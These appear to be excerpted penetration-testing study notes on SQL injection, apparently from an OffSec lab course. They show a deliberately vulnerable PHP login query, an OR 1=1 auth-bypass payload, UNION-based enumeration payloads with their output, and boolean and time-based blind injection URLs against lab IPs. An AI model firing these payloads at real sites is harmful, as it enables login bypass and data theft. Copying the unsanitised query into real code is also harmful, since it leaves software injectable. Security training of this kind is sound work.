  97. ###### SQL Theory Refresher
  98. ​
  99. Structured Query Language (SQL) has been developed specifically to manage and interact with data stored inside [relational databases](https://en.wikipedia.org/wiki/Relational_database).
  100. ​
  101. **Example:** parse user table and retrieve a specified user entry.
  102. ```
  103. SELECT * FROM users WHERE user_name='noel'
  104. ```
  105. ​
  106. Web apps automate functionality by embedding SQL queries in their source code, see the PHP example;
  107. ```
  108. <?php
  109. $uname = $_POST['uname'];
  110. $passwd =$_POST['password'];
  111. ​
  112. $sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
  113. $result = mysqli_query($con, $sql_query);
  114. ?>
  115. ```
  116. *Please note that the i inside the mysqli_query PHP function stands for improved and should not be confused with the vulnerability (as the i in SQLi stands for injection).*
  117. ​
  118. In order to search the database, the SQL server runs the query SELECT * FROM users WHERE user_name= noel. If, instead, the user enters "noel '+!@#$", the SQL server will run the query SELECT * FROM users WHERE user_name= noel'+!@#$. Nothing in our code block checks for these special characters, and it's this lack of filtering that causes the vulnerability.

  339. ###### Identifying SQLi via Error-based Payloads
  340. ​
  341. ```
  342. <?php
  343. $uname = $_POST['uname'];
  344. $passwd =$_POST['password'];
  345. ​
  346. $sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
  347. $result = mysqli_query($con, $sql_query);
  348. ?>
  349. ```
  350. - In the PHP snipped above.
  351. - `uname` and `password` are user-supplied.
  352. - This means we can control the `$sql_query` variable.
  353. - Allows us to craft a new query!
  354. - In some cases SQLi can lead to auth bypass, the first vector we will explore.
  355. - By forcing the closing quote on `uname` and adding `OR 1=1` followed by a `--` comment seperator and `//` we can prematurely terminate the SQL statement.
  356. - The syntax for this type of comment requires `//` followed by ` ` whitespace char.
  357. - Trailing the comments with `//` provides.
  358. - Visibility on payload.
  359. - Some protection agains whitespace truncation employed by web app.
  360. ```
  361. offsec' OR 1=1 -- //
  362. ```
  363. ​
  364. As a result, forwarde to SQL server;
  365. ```
  366. SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 --
  367. ```
  368. ​
  369. - The appended OR statement will always be true.
  370. - The WHERE clause will return the first user ID present in DB.
  371. - Whether or not the record is present.
  372. - Because no other checks are implemented by app, we gain admin privs by circumventing auth logic!
  373. ​

  429. ###### UNION-based Payloads
  430. ​
  431. - When dealing with in-band SQLi and the result of the query is returned along with the application-returned value;
  432. - Test for UNION-BASED SQL Injection next!!!
  433. - [UNION](https://www.w3schools.com/sql/sql_union.asp) keyword.
  434. - Enables an extra select statement in a single query.
  435. - Providing both results.
  436. - Concat both query into one statement.
  437. ​
  438. UNION SQLi requires two conditions to be true;
  439. - The injected UNION has the same number of cols as the original query.
  440. - Data types of the cols must be compatible.
  441. ​
  442. To demonstrate;
  443. ```
  444. $query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
  445. ```
  446. - [LIKE](https://www.w3schools.com/sql/sql_like.asp)
  447. - Before crafting attack we need to know the exact number of cols in the target table.
  448. - The example output shows 4 cols, but we should not assume.
  449. - There may be extra cols not displayed.
  450. - To discover the actual number of cols, inject;
  451. - `' ORDER BY 1-- //`
  452. - The above statement orders the results by a specific col.
  453. - It will fail when sel col does not exist.
  454. - Inc the col val by 1 each time.
  455. ```
  456. ' ORDER BY 6-- //
  457. ```
  458. Returns;
  459. ```
  460. Unknown column '6' in 'order clause'
  461. ```
  462. - Odering by col 6 returns an error.
  463. - We have determined there are 5 cols.
  464. - With this info we can craft first attack.
  465. - Since we want to use the customer table;
  466. - `%'`
  467. - Begin injected query with;
  468. - `UNION SELECT`
  469. - Statement dumps current DB, user, MySQL version in first, second, third col and leaves fourth, fifth NULL.
  470. - `database(), user(), @@version, null, null -- //`
  471. ```
  472. %' UNION SELECT database(), user(), @@version, null, null -- //
  473. ```
  474. Returns;
  475. ```
  476. Name Phone Address Country
  477. Vladimir Vega 1-482-784-2019 900-5245 Ornare Ave South Africa
  478. Xavier Wolf (559) 271-7551 564-4427 Pede Road Poland
  479. Lane Wooten (684) 688-7367 562-4770 Gravida Road Vietnam
  480. Laurel Chavez (481) 611-0866 6184 Vivamus Ave Singapore
  481. Holmes Griffith (714) 669-5321 Ap #133-6689 Vestibulum Rd. Singapore
  482. root@172.30.0.3 8.0.28
  483. ```
  484. - Username and DB version on last line, but DB name is not.
  485. - This happens because col 1 is typically reserved for an ID field of `integer` data type.
  486. - It cannot return the string value through the `SELECT databse()` statement.
  487. - *The web application is explicitly omitting the output from the first column because IDs are not usually useful information for end users.*.
  488. - Knowing this, shift enumerating functions to the right-most positions.
  489. - Avoids type mismatches.
  490. - *Since we verified the expected output, we can omit the % sign in our new query*.
  491. ```
  492. ' UNION SELECT null, null, database(), user(), @@version -- //
  493. ```
  494. Returns;
  495. ```
  496. Name Phone Address Country
  497. offsec root@172.30.0.3 8.0.28
  498. ```
  499. - Values have returned correctly, showing `offsec` as the current DB.

  508. ```

  549. ###### Blind SQL Injections
  550. ​
  551. The SQLi payloads we have worked with so far are "in-band", meaning we retrieve the content of our query inside the web app.
  552. ​
  553. Blind SQLi is a case where responses are never returned. Response is inferred using;
  554. - Boolean.
  555. - Time-based logic.
  556. ​
  557. Boolean-based blind SQL injection causes the app to return different predictible values whenever the DB returns TRUE or FALSE.
  558. *Although "boolean-based" might not seem like a blind SQLi variant, the output used to infer results comes from the web application, not the database itself.*
  559. ​
  560. Time-based blind SQLi infer the query result by instructing the DB to wait for a specified amount of time. Based on response time, we can conclude if the statement is TRUE or FALSE.
  561. ​
  562. Log into blind SQLi test page and notice that the URL takes a `user` param;
  563. ```
  564. http://192.168.202.16/blindsqli.php?user=offsec
  565. ```
  566. - This value defaults to the logged in user, offsec.
  567. - App prints the user record;
  568. - Username.
  569. - Password MD5 hash.
  570. - Description.
  571. - To test for boolean-based SQLi we can append the following payload;
  572. ```
  573. http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
  574. ```
  575. - Since 1=1 is TRUE the app will return values only if the user is present in the DB.
  576. - Using this syntax you could enumerate the entire DB.
  577. - With time based payload;
  578. ```
  579. http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
  580. ```
  581. - Note app hangs for 3 seconds before returning.
  582. - TRUE.
  583. - Returns immediately.
  584. - FALSE.
  585. *This type of attack is time consuming and should be automated through tools like SQLmap*
